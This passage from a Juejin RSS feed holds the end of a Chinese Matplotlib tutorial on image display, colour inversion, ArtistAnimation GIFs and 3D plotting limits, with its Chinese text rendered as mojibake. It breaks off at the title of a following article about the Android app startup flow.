img = [[<span class="hljs-number">0.0</span>,<span class="hljs-number">0.2</span>,<span class="hljs-number">0.4</span>],
       [<span class="hljs-number">0.6</span>,<span class="hljs-number">0.8</span>,<span class="hljs-number">1.0</span>],
       [<span class="hljs-number">0.0</span>,<span class="hljs-number">0.5</span>,<span class="hljs-number">1.0</span>]]

<span class="hljs-comment"># ä½¿ç”¨ imshow æ˜¾ç¤ºå›¾åƒ</span>
ax.imshow(
    img,
    cmap=<span class="hljs-string">'gray'</span>,          <span class="hljs-comment"># é¢œè‰²æ˜ å°„ï¼š'gray' è¡¨ç¤ºç°åº¦æ˜ å°„ï¼Œæ›´å¤šæ˜ å°„è§„åˆ™è¯¦è§æ•£ç‚¹å›¾ç« èŠ‚</span>
    aspect=<span class="hljs-string">'equal'</span>,       <span class="hljs-comment"># ä¿æŒåƒç´ ä¸ºæ­£æ–¹å½¢ï¼Œé˜²æ­¢å›¾åƒæ‹‰ä¼¸</span>
    interpolation=<span class="hljs-string">'nearest'</span>,<span class="hljs-comment"># å›¾åƒå¹³æ»‘æ’å€¼æ–¹æ³•ï¼Œå¯é€‰ nearest(é»˜è®¤é”¯é½¿ï¼Œé€‚åˆåƒç´ è‰ºæœ¯), bilinear(åŒçº¿æ€§å¹³æ»‘), bicubic(åŒä¸‰æ¬¡å¹³æ»‘), ...</span>
    alpha=<span class="hljs-number">1.0</span>,            <span class="hljs-comment"># ä¸é€æ˜åº¦ï¼Œ1.0 ä¸ºå®Œå…¨ä¸é€æ˜</span>
    extent=(<span class="hljs-number">10.0</span>, <span class="hljs-number">20.0</span>, <span class="hljs-number">5.0</span>, <span class="hljs-number">15.0</span>)  <span class="hljs-comment"># å®šä¹‰å›¾åƒåœ¨åæ ‡è½´ä¸­çš„ä½ç½®å’ŒèŒƒå›´</span>
    <span class="hljs-comment"># extent æ ¼å¼: (å·¦è¾¹ç•Œ, å³è¾¹ç•Œ, ä¸‹è¾¹ç•Œ, ä¸Šè¾¹ç•Œ)</span>
)
</code></pre>
<p>è¿è¡Œç»“æœå¦‚å›¾27æ‰€ç¤ºã€‚ç”±äºæˆ‘ä»¬è®¾ç½®äº† <code>extent=(10, 20, 5, 15)</code>ï¼Œè¿™ä¸ªå°å°çš„ <strong>3x3</strong> å›¾åƒä¼šè¢«â€œæ‹‰ä¼¸â€å¹¶æ”¾ç½®åˆ°åæ ‡ç³»ä¸­ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>âˆˆ</mo><mo stretchy="false">[</mo><mn>10</mn><mo separator="true">,</mo><mn>20</mn><mo stretchy="false">]</mo><mo separator="true">,</mo><mi>y</mi><mo>âˆˆ</mo><mo stretchy="false">[</mo><mn>5</mn><mo separator="true">,</mo><mn>15</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">x \in [10, 20], y \in [5, 15]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"/><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">âˆˆ</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">[</span><span class="mord">10</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">20</span><span class="mclose">]</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">âˆˆ</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">[</span><span class="mord">5</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">15</span><span class="mclose">]</span></span></span></span></span> çš„çŸ©å½¢åŒºåŸŸå†…ã€‚å¹¶ä¸”ç”±äºä½¿ç”¨äº†<code>gray</code>ç°åº¦æ˜ å°„ï¼Œå› æ­¤å€¼ä¸º0çš„åƒç´ å°±ä¼šæ˜¾ç¤ºä¸ºçº¯é»‘è‰²ï¼Œå€¼ä¸º1çš„åƒç´ å°±ä¼šæ˜¾ç¤ºä¸ºçº¯ç™½è‰²ï¼Œä¸­é—´å€¼å‘ˆç°ç›¸åº”çš„ç°è‰²ã€‚</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b75ac4a55d8346188adb9b0a3db127db~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770769621&amp;x-signature=U%2Fmgjct2dgxQkbAbJ4IsRdCrPyQ%3D" alt="c21.jpg" width="100%" loading="lazy"/></p>
<p>å½“å›¾åƒæ•°æ®åŒ…å«å¤šä¸ªé€šé“ï¼ˆä¾‹å¦‚ RGB ä¸‰ä¸ªé¢œè‰²é€šé“ï¼‰æ—¶ï¼Œå®ƒå°±ä»£è¡¨äº†å½©è‰²å›¾åƒã€‚æ­¤æ—¶ï¼Œ<code>cmap</code> å‚æ•°å°†ä¸å†ç”Ÿæ•ˆï¼Œå› ä¸ºé¢œè‰²ä¿¡æ¯å·²ç›´æ¥åŒ…å«åœ¨æ•°æ®ä¸­ã€‚å¤„ç†è¿™ç§å¤šç»´æ•°ç»„æ•°æ®ï¼Œä½¿ç”¨ NumPy ä¼šéå¸¸æ–¹ä¾¿ã€‚ä¸‹é¢çš„æ•™ç¨‹é»˜è®¤ä½ å·²ç†Ÿæ‚‰ NumPy çš„åŸºæœ¬æ“ä½œã€‚</p>
<p>è®©æˆ‘ä»¬å°è¯•è¯»å–ä¸€ä¸ªå¤–éƒ¨å›¾ç‰‡æ–‡ä»¶ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt
<span class="hljs-keyword">import</span> matplotlib.image <span class="hljs-keyword">as</span> mpimg  <span class="hljs-comment"># Matplotlib æä¾›çš„å›¾åƒè¯»å–å·¥å…·</span>
<span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np

fig, ax = plt.subplots(figsize=(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>))

<span class="hljs-comment"># è¯»å–å›¾åƒ (æ”¯æŒ JPG, PNG, BMP, TIFF ç­‰å¸¸è§æ ¼å¼)</span>
<span class="hljs-comment"># å‡½æ•°è¿”å›ä¸€ä¸ª NumPy æ•°ç»„ï¼Œåƒç´ å€¼é€šå¸¸è¢«è‡ªåŠ¨å½’ä¸€åŒ–åˆ° [0.0, 1.0] åŒºé—´</span>
img = mpimg.imread(<span class="hljs-string">"../media/icon48.png"</span>)
<span class="hljs-built_in">print</span>(img.shape)
<span class="hljs-comment"># ==== è¾“å‡ºç¤ºä¾‹ ====</span>
<span class="hljs-comment"># (48, 48, 4)</span>
</code></pre>
<p>è¾“å‡ºæ˜¾ç¤ºå›¾åƒæ•°ç»„çš„å½¢çŠ¶ä¸º <code>(48, 48, 4)</code>ã€‚è¿™è¡¨ç¤ºè¿™æ˜¯ä¸€å¼  <strong>48 åƒç´ é«˜ï¼Œ48 åƒç´ å®½</strong> çš„å›¾ç‰‡ï¼Œå¹¶ä¸”æœ‰ <strong>4 ä¸ªé€šé“</strong>ã€‚é€šå¸¸ï¼Œè¿™å¯¹åº”ç€ <strong>RGBA</strong> æ¨¡å¼ï¼šçº¢ã€ç»¿ã€è“ä¸‰ä¸ªé¢œè‰²é€šé“ï¼Œå¤–åŠ ä¸€ä¸ª Alpha é€šé“ï¼ˆæ§åˆ¶é€æ˜åº¦ï¼‰ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥å¯¹å›¾åƒæ•°ç»„è¿›è¡Œæ“ä½œæ¥å®ç°å„ç§æ•ˆæœã€‚ä¾‹å¦‚ï¼Œå…ˆä¸¢å¼ƒ Alpha é€šé“åªä¿ç•™ RGBï¼Œç„¶åè¿›è¡Œåè‰²å¤„ç†ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># åªä¿ç•™å‰ä¸‰ä¸ªé€šé“ï¼ˆRGBï¼‰ï¼Œä¸¢å¼ƒ Alpha é€šé“</span>
img_rgb = img[:, :, :<span class="hljs-number">3</span>]

<span class="hljs-comment"># è¿›è¡Œåè‰²æ“ä½œï¼š1 - åŸå€¼</span>
new_img = <span class="hljs-number">1</span> - img_rgb

<span class="hljs-comment"># æ˜¾ç¤ºå¤„ç†åçš„å›¾åƒ</span>
ax.imshow(
    new_img,
    aspect=<span class="hljs-string">"equal"</span>,           <span class="hljs-comment"># ä¿æŒå®½é«˜æ¯”ï¼Œåƒç´ å‘ˆæ­£æ–¹å½¢</span>
    interpolation=<span class="hljs-string">"bicubic"</span>,  <span class="hljs-comment"># ä½¿ç”¨åŒä¸‰æ¬¡æ’å€¼ï¼Œä½¿å›¾åƒçœ‹èµ·æ¥æ›´å¹³æ»‘</span>
    alpha=<span class="hljs-number">1</span>,                  <span class="hljs-comment"># ä¸é€æ˜åº¦</span>
    extent=(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>),      <span class="hljs-comment"># å°†å›¾åƒæ”¾ç½®åœ¨åæ ‡ç³»ä¸­ (0,0) åˆ° (1,1) çš„èŒƒå›´å†…</span>
)
</code></pre>
<p>è¿è¡Œç»“æœå¦‚å›¾28æ‰€ç¤ºã€‚ç”±äºæˆ‘ä»¬åšäº† <code>1 - img</code> çš„åè‰²è®¡ç®—ï¼ŒåŸæœ¬é»‘è‰²çš„åŒºåŸŸå˜æˆäº†ç™½è‰²ï¼Œç™½è‰²å˜æˆäº†é»‘è‰²ï¼Œå¾—åˆ°äº†ä¸€ä¸ªâ€œåº•ç‰‡â€æ•ˆæœã€‚è¿™å±•ç¤ºäº†å›¾åƒæ•°æ®çš„æœ¬è´¨â€”â€”åªæ˜¯ä¸€ä¸ªæ•°å€¼æ•°ç»„ï¼Œæˆ‘ä»¬å¯ä»¥åƒå¤„ç†æ™®é€šçŸ©é˜µä¸€æ ·å¯¹å®ƒè¿›è¡ŒåŠ å‡ä¹˜é™¤ã€æ»¤æ³¢ã€å˜æ¢ç­‰ä»»ä½•æ•°å­¦è¿ç®—ï¼Œä»è€Œåˆ›é€ å‡ºæ— ç©·çš„è§†è§‰æ•ˆæœã€‚</p>
<p>å›¾åƒåŠŸèƒ½çš„å¼ºå¤§ä¹‹å¤„åœ¨äºå®ƒèƒ½ä¸ Matplotlib çš„å…¶ä»–å›¾è¡¨å…ƒç´ æ— ç¼èåˆã€‚ä½ å¯ä»¥æŠŠå›¾ç‰‡å½“ä½œä¸€ä¸ªç‰¹æ®Šçš„â€œå›¾å±‚â€æˆ–â€œæ ‡è®°â€ï¼Œæ”¾ç½®åœ¨åæ ‡ç³»çš„ä»»ä½•ä½ç½®ï¼Œæˆ–è€…è‡ªå·±ç”¨åƒç´ æ“ä½œç»˜åˆ¶ä¸€ä¸ªå›¾å½¢ï¼Œè¿™è®©ä½ èƒ½å¤Ÿåˆ›å»ºå‡ºæå…·ä¸ªæ€§åŒ–å’Œä¿¡æ¯ä¸°å¯Œçš„å¤åˆå›¾è¡¨ã€‚</p>
<p>ä¸‹é¢æ˜¯ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼Œå°†æˆ‘ä»¬è¯»å–çš„å›¾æ ‡ä¸ä¸€ä¸ªæ­£å¼¦å‡½æ•°æ›²çº¿ç»˜åˆ¶åœ¨åŒä¸€åæ ‡ç³»ä¸­ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt
<span class="hljs-keyword">import</span> matplotlib.image <span class="hljs-keyword">as</span> mpimg
<span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np

fig, ax = plt.subplots(figsize=(<span class="hljs-number">5</span>, <span class="hljs-number">5</span>))

<span class="hljs-comment"># 1. é¦–å…ˆï¼Œç»˜åˆ¶å›¾åƒ</span>
img = mpimg.imread(<span class="hljs-string">"../media/icon48.png"</span>)
ax.imshow(
    img,
    aspect=<span class="hljs-string">"equal"</span>,
    interpolation=<span class="hljs-string">"bicubic"</span>,
    alpha=<span class="hljs-number">0.8</span>,                 <span class="hljs-comment"># è®¾ç½®ä¸€ç‚¹é€æ˜åº¦ï¼Œè®©åé¢çš„æ›²çº¿è‹¥éšè‹¥ç°</span>
    extent=(<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, -<span class="hljs-number">1</span>, <span class="hljs-number">0</span>),      <span class="hljs-comment"># å°†å›¾æ ‡æ”¾ç½®åœ¨ x=[4,5], y=[-1,0] çš„çŸ©å½¢åŒºåŸŸ</span>
)

<span class="hljs-comment"># 2. ç„¶åï¼Œåœ¨åŒä¸€ä¸ªåæ ‡ç³»ä¸Šç»˜åˆ¶æ ‡å‡†çš„å‡½æ•°æ›²çº¿</span>
x = np.linspace(<span class="hljs-number">0</span>, <span class="hljs-number">10</span>, <span class="hljs-number">100</span>)
y = np.sin(x)
ax.plot(x, y, linewidth=<span class="hljs-number">2</span>, label=<span class="hljs-string">'sin(x)'</span>)

<span class="hljs-comment"># 3. è®¾ç½®åæ ‡è½´èŒƒå›´</span>
ax.set_ylim(-<span class="hljs-number">2</span>, <span class="hljs-number">2</span>)
</code></pre>
<p>è¿è¡Œç»“æœå¦‚å›¾29æ‰€ç¤ºã€‚</p>
<h3 data-id="heading-17">ä¹. åŠ¨ç”»æ¸²æŸ“</h3>
<p>Matplotlib ç¡®å®æä¾›äº†åŠ¨ç”»åŠŸèƒ½ï¼Œä¸è¿‡åœ¨å®é™…åº”ç”¨ä¸­ï¼Œæˆ‘ä»¬é€šå¸¸ä¸ä¼šå°†å®ƒä½œä¸ºä¸“ä¸šçš„åŠ¨ç”»å·¥å…·ã€‚å¯¹äºå¤æ‚çš„æ•°å­¦å¯è§†åŒ–åŠ¨ç”»ï¼Œä¸šç•Œæœ‰æ›´ä¸“ä¸šçš„åº“å¯ä»¥é€‰æ‹©ï¼Œæ¯”å¦‚ <a href="https://link.juejin.cn?target=https%3A%2F%2Fspace.bilibili.com%2F88461692" target="_blank" title="https://space.bilibili.com/88461692" ref="nofollow noopener noreferrer">3Blue1Brown</a> å¼€æºçš„ <strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.manim.community%2F" target="_blank" title="https://www.manim.community/" ref="nofollow noopener noreferrer">manim</a></strong>ã€‚</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f455b50a9d9e40ce84ebbf5f5e515266~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770769621&amp;x-signature=2C4Bqtmh4zHmeHRY4nQqkijnoWI%3D" alt="c22.jpg" width="100%" loading="lazy"/></p>
<p>å°½ç®¡å¦‚æ­¤ï¼Œäº†è§£ Matplotlib åŠ¨ç”»çš„åŸºæœ¬åŸç†è¿˜æ˜¯æœ‰ä»·å€¼çš„ï¼Œå°¤å…¶å½“ä½ éœ€è¦å¿«é€Ÿç”Ÿæˆç®€å•åŠ¨ç”»æˆ–æ•™å­¦æ¼”ç¤ºæ—¶ã€‚</p>
<p>Matplotlib åŠ¨ç”»çš„æ ¸å¿ƒæ€è·¯éå¸¸ç®€å•ï¼š<strong>ç”Ÿæˆä¸€ç³»åˆ—é™æ€å›¾è¡¨ï¼ˆå¸§ï¼‰ï¼Œç„¶åæŒ‰é¡ºåºè¿ç»­æ’­æ”¾</strong>ã€‚æ¯ä¸€å¸§å¯¹åº”æ•°æ®çš„ä¸€ä¸ªçŠ¶æ€ï¼Œå°†è¿™äº›å¸§ä¸²è”èµ·æ¥ï¼Œå°±å½¢æˆäº†åŠ¨ç”»ã€‚</p>
<p>Matplotlib æä¾›ä¸¤ç§ä¸»è¦åŠ¨ç”»æ–¹æ³•ï¼š</p>
<ul>
<li><strong><code>FuncAnimation</code></strong>ï¼šå®æ—¶ç”Ÿæˆæ¯ä¸€å¸§ï¼Œé€‚åˆåŠ¨æ€æ›´æ–°æˆ–æ•°æ®æµåœºæ™¯</li>
<li><strong><code>ArtistAnimation</code></strong>ï¼šé¢„å…ˆç”Ÿæˆæ‰€æœ‰å¸§å¹¶å­˜å‚¨åœ¨å†…å­˜ä¸­ï¼Œé€‚åˆå¸§æ•°ç¡®å®šã€å†…å®¹ä¸å˜çš„åŠ¨ç”»</li>
</ul>
<p>è€ƒè™‘åˆ°æ˜“å­¦æ€§å’Œå…¸å‹ä½¿ç”¨åœºæ™¯ï¼Œæœ¬æ•™ç¨‹ä¸»è¦ä»‹ç» <code>ArtistAnimation</code> æ–¹å¼ã€‚</p>
<blockquote>
<p><strong>æ³¨æ„</strong>ï¼šç”±äº <code>ArtistAnimation</code> ä¼šå°†æ‰€æœ‰å¸§ä¿ç•™åœ¨å†…å­˜ä¸­ï¼Œå¦‚æœåŠ¨ç”»å¸§æ•°å¾ˆå¤šæˆ–æ¯å¸§å†…å®¹å¤æ‚ï¼Œå¯èƒ½ä¼šå ç”¨è¾ƒå¤§å†…å­˜ã€‚ä¸è¿‡å¯¹äºä¸€èˆ¬çš„æ•°æ®å¯è§†åŒ–ï¼ˆå‡ ååˆ°å‡ ç™¾å¸§ï¼‰ï¼Œè¿™é€šå¸¸ä¸æ˜¯é—®é¢˜ã€‚</p>
</blockquote>
<p>ä¸‹é¢æˆ‘ä»¬é€šè¿‡ä¸€ä¸ªä¾‹å­ï¼Œç»˜åˆ¶æ­£å¼¦æ³¢é€æ¸å¹³ç§»çš„åŠ¨ç”»ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt
<span class="hljs-keyword">import</span> matplotlib.animation <span class="hljs-keyword">as</span> animation
<span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np

fig, ax = plt.subplots()

<span class="hljs-comment"># åæ ‡è½´çš„åŸºæœ¬è®¾ç½®ï¼ˆåœ¨å¾ªç¯å¤–é¢è®¾ç½®ï¼‰</span>
ax.set_xlim(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>*np.pi)
ax.set_xlabel(<span class="hljs-string">'x'</span>)
ax.set_ylabel(<span class="hljs-string">'y'</span>)
ax.set_title(<span class="hljs-string">'sin_Animation'</span>)
ax.grid(<span class="hljs-literal">True</span>)

frames = []  <span class="hljs-comment"># å­˜å‚¨æ¯å¸§çš„ Artist åˆ—è¡¨</span>
x = np.linspace(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>*np.pi, <span class="hljs-number">100</span>)

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>): <span class="hljs-comment"># ç”Ÿæˆ50å¸§åŠ¨ç”»</span>
    <span class="hljs-comment"># æ¯å¸§ç»˜åˆ¶æ–°å†…å®¹ï¼Œè¿”å›çš„ Artists åŠ å…¥å½“å‰å¸§åˆ—è¡¨</span>
    line, = ax.plot(x, np.sin(x + i*<span class="hljs-number">0.1</span>), color=<span class="hljs-string">'blue'</span>)
    text = ax.text(<span class="hljs-number">0.5</span>, <span class="hljs-number">0.9</span>, <span class="hljs-string">f'Frame <span class="hljs-subst">{i}</span>'</span>, transform=ax.transAxes)
    
    <span class="hljs-comment"># å°†å½“å‰å¸§ä¸­ä¼šå˜åŒ–çš„å…ƒç´ ï¼ˆline å’Œ textï¼‰åŠ å…¥åˆ—è¡¨</span>
    frames.append([line, text]) 

<span class="hljs-comment"># åˆ›å»ºåŠ¨ç”»å¯¹è±¡</span>
ani = animation.ArtistAnimation(
    fig, 
    frames,           <span class="hljs-comment"># é¢„å…ˆç”Ÿæˆçš„å¸§åºåˆ—</span>
    interval=<span class="hljs-number">40</span>,      <span class="hljs-comment"># æ¯å¸§é—´éš” 40 æ¯«ç§’</span>
    repeat=<span class="hljs-literal">True</span>,      <span class="hljs-comment"># å¾ªç¯æ’­æ”¾</span>
    blit=<span class="hljs-literal">True</span>         <span class="hljs-comment"># å¯ç”¨åŒç¼“å†²ä¼˜åŒ–ï¼Œæå‡æ¸²æŸ“æ€§èƒ½</span>
)

<span class="hljs-comment"># ä¿å­˜ä¸º GIF æ–‡ä»¶ï¼ˆä¹Ÿå¯ä¿å­˜ä¸º MP4ï¼Œä½†éœ€è¦å®‰è£… ffmpegï¼‰</span>
ani.save(
    <span class="hljs-string">'sine_animation.gif'</span>,  <span class="hljs-comment"># æ–‡ä»¶å</span>
    writer=<span class="hljs-string">'pillow'</span>,       <span class="hljs-comment"># ä½¿ç”¨ Pillow åº“å†™å…¥ GIF</span>
    fps=<span class="hljs-number">25</span>,                <span class="hljs-comment"># å¸§ç‡ï¼ˆä¸ interval=40 å¯¹åº”ï¼‰</span>
    dpi=<span class="hljs-number">100</span>                <span class="hljs-comment"># è¾“å‡ºåˆ†è¾¨ç‡</span>
)

plt.show()
</code></pre>
<h3 data-id="heading-18">å. 3Då›¾è¡¨</h3>
<p>Matplotlib æœ¬è´¨ä¸Šæ˜¯äºŒç»´ç»˜å›¾åº“ï¼Œå…¶ä¸‰ç»´åŠŸèƒ½æ˜¯é€šè¿‡<strong>ä¸‰ç»´æ•°æ®æŠ•å½±åˆ°äºŒç»´å¹³é¢</strong>ï¼Œå¹¶é…åˆæ·±åº¦æ’åºï¼ˆz-orderï¼‰æ¥å®ç°çš„ã€‚è¿™ç§æ–¹å¼é€‚åˆç®€å•çš„ä¸‰ç»´å¯è§†åŒ–ï¼Œä½†åœ¨å¤„ç†å¤æ‚ä¸‰ç»´åœºæ™¯æ—¶å­˜åœ¨ä¸€å®šå±€é™ã€‚å®ƒäº¤äº’æ€§æ¯”è¾ƒå¼±ï¼Œæ—‹è½¬ã€ç¼©æ”¾ä¸å¦‚ä¸“ä¸šä¸‰ç»´è½¯ä»¶æµç•…ã€‚å®ƒæ¸²æŸ“æ•ˆæœæœ‰é™,éš¾ä»¥å®ç°å¤æ‚å…‰ç…§ã€é€æ˜ä½“ç»˜åˆ¶ã€æµåœºæ¨¡æ‹Ÿç­‰é«˜çº§ç‰¹æ•ˆã€‚å¹¶ä¸”å½“æ•°æ®é‡è¿‡å¤§æ—¶ï¼Œæ¸²æŸ“ä¼šå˜æ…¢å¾ˆå¤šã€‚</p>
<p>å› æ­¤å¯¹äºå¤æ‚ä¸“ä¸šçš„3Då›¾è¡¨ç»˜åˆ¶å¹¶ä¸æ¨èä½¿ç”¨matplotlibè¿›è¡Œç»˜åˆ¶ï¼Œä½†æ˜¯å¯¹äºç®€å•çš„3Dæ¼”ç¤ºMatplotlib è¿˜æ˜¯å¯ä»¥åšåˆ°çš„ï¼Œæ¯”å¦‚ç®€å•çš„3Dæ›²é¢å›¾ï¼Œçº¿æ¡†å›¾ï¼Œ3Dçº¿å›¾ï¼Œ3Dæ•£ç‚¹å›¾ç­‰</p>
<p>å¦‚æœä½ éœ€è¦ä¸“ä¸šçš„3Dç§‘ç ”ç»˜å›¾è½¯ä»¶/pythonåº“ï¼Œæ¨èä½¿ç”¨<strong>Mayavi</strong></p>
<h3 data-id="heading-19">åä¸€. å…¶å®ƒå›¾è¡¨</h3>
<p>è‡³æ­¤ï¼Œæˆ‘ä»¬å·²ç»ç³»ç»Ÿæ€§åœ°è®²è§£äº† Matplotlib ä¸­æœ€æ ¸å¿ƒã€æœ€é«˜é¢‘çš„å›¾è¡¨ç±»å‹å’Œç»˜å›¾é€»è¾‘ã€‚ç„¶è€Œï¼Œå®ƒçš„èƒ½åŠ›è¿œä¸æ­¢äºæ­¤ã€‚å°±åƒä¸€ä¸ªåŠŸèƒ½ä¸°å¯Œçš„å·¥å…·ç®±ï¼Œé™¤äº†å¸¸ç”¨çš„â€œæ‰³æ‰‹â€å’Œâ€œèºä¸åˆ€â€ï¼Œå®ƒè¿˜æä¾›äº†è®¸å¤šé’ˆå¯¹ç‰¹å®šåœºæ™¯çš„å·¥å…·ï¼š</p>
<p>æ¯”å¦‚ç»˜åˆ¶ç®€å•å›¾å½¢ï¼ˆåœ†å½¢ï¼Œè±å½¢ï¼ŒçŸ©å½¢ç­‰ï¼‰ï¼Œæåæ ‡ç³»ï¼Œç®±å½¢å›¾ï¼Œé¥¼å›¾ï¼Œå…­è¾¹å½¢åˆ†ç®±å›¾ï¼ŒçŸ¢é‡åœºå›¾ï¼Œæµçº¿å›¾ï¼Œå°æç´å›¾ï¼Œæ•°æ®è¡¨æ ¼...</p>
<p><strong>ä½ ä¸éœ€è¦ç«‹å³æŒæ¡æ‰€æœ‰è¿™äº›å†…å®¹ã€‚</strong> æœ¬ç³»åˆ—æ•™ç¨‹çš„æ ¸å¿ƒç›®æ ‡ï¼Œæ˜¯ä¸ºä½ æ„å»ºä¸€ä¸ªåšå®ã€é€šç”¨çš„ç»˜å›¾æ€ç»´æ¡†æ¶å’Œæ“ä½œåŸºç¡€ã€‚ä½ ç°åœ¨å·²ç»æ‹¥æœ‰äº†é˜…è¯»å®˜æ–¹æ–‡æ¡£ã€ç†è§£ç¤ºä¾‹ä»£ç å¹¶å¿«é€Ÿä¸Šæ‰‹çš„èƒ½åŠ›ã€‚</p>
<p>å½“ä½ æœªæ¥çš„é¡¹ç›®éœ€è¦æŸä¸ªç‰¹å®šç±»å‹çš„å›¾è¡¨æ—¶ï¼Œå®Œå…¨å¯ä»¥å¸¦ç€æ˜ç¡®çš„ç›®æ ‡å»å®šå‘å­¦ä¹ ã€‚åœ¨ä½ åšå®çš„åŸºç¡€ä¸Šï¼Œå†è®©AIæ¥è¾…åŠ©å­¦ä¹ ç†è§£ï¼Œé©¬ä¸ŠæŒæ¡ä¸€ä¸ªæ–°ç±»å‹çš„å›¾è¡¨ä¸æ˜¯ä»€ä¹ˆéš¾äº‹ã€‚</p>
<p>è®°ä½ï¼Œ<strong>å·¥å…·ä¸ºæ€æƒ³æœåŠ¡</strong>ã€‚æœ€åï¼Œæˆ‘æƒ³è¯´ï¼Œä¸è®ºä½ æ˜¯ä»€ä¹ˆä¸“ä¸šï¼Œåªè¦æ˜¯æ‰“ç®—å­¦ä¹ pythonï¼Œé‚£ä¹ˆpandasï¼Œmatplotlibï¼Œnumpyè¿™ä¸‰ä¸ªåº“æœ€å¥½éƒ½å»å­¦ä¹ ä¸€ä¸‹ï¼Œå› ä¸ºå®ƒä»¬æ˜¯ä½ åœ¨Pythonä¸–ç•Œä¸­ï¼Œå¤„ç†ã€åˆ†æå’Œå‘ˆç°<strong>æ•°æ®</strong>çš„<strong>åŸºç¡€èƒ½åŠ›ä¸‰è§’</strong>ã€‚æ— è®ºä½ æ˜¯è¿›è¡Œå­¦æœ¯ç ”ç©¶ã€å•†ä¸šåˆ†æã€ç½‘ç«™å¼€å‘ï¼Œè¿˜æ˜¯å­¦ä¹ äººå·¥æ™ºèƒ½ï¼Œå‡ ä¹æ‰€æœ‰çš„æ•°æ®ä»»åŠ¡éƒ½ç»•ä¸å¼€è¿™ä¸‰ä¸ªåº“ä»¥åŠå®ƒä»¬çš„è®¾è®¡æ€æƒ³ã€‚å®ƒä»¬æ„æˆäº†ä¸€ä¸ªä»æ•°æ®åˆ°è§è§£çš„å®Œæ•´å·¥ä½œæµï¼ŒæŒæ¡å¹¶ä¸”èƒ½ç†Ÿç»ƒä½¿ç”¨å®ƒä»¬ï¼Œä½ çš„Pythonå¯ä»¥è¯´æ˜¯çœŸæ­£çš„å…¥é—¨äº†ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Android App å¯åŠ¨æµç¨‹ ç¬”è®°]]></title>    <link>https://juejin.cn/post/7602454700504170537</link>    <guid>https://juejin.cn/post/7602454700504170537</guid>    <pubDate>2026-02-04T01:08:33.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602454700504170537" data-draft-id="7602497125268242438" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Android App å¯åŠ¨æµç¨‹  ç¬”è®°"/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2026-02-04T01:08:33.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¿ƒæºxinyuan"/> <meta itemprop="url" content="https://juejin.cn/user/4283353029151694"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Android App å¯åŠ¨æµç¨‹  ç¬”è®°
